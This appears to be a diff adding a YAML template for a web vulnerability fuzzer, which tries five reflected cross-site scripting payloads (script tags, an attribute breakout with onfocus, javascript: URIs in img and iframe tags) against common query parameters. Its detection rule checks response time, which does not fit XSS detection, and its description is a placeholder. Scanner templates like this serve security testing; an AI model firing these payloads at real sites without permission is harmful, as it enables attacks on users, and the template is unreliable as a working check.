@@ -1,0 +1,36 @@
+id: xss-alert-basic3
+
+attack-type: fuzz
+level: 2
+info:
+  name: Xss - reflected
+  author: Sharryy
+  severity: High
+  description: random description
+  category: XSS
+
+variables:
+  - keywords
+  - q
+  - search
+  - query
+  - m
+  - test
+  - filter
+
+payloads:
+  - >-
+    <script>alert(document.domain)</script>
+  - >-
+    "><script>alert(document.domain)</script>
+  - >-
+    " onfocus="alert(1)" name="bounty
+  - >-
+    <IMG SRC="javascript:alert('XSS');">
+  - >-
+    <iframe src="javascript:alert(`xss`)">
+
+requests:
+  - detections:
+      - >-
+        ResponseTime() > 10
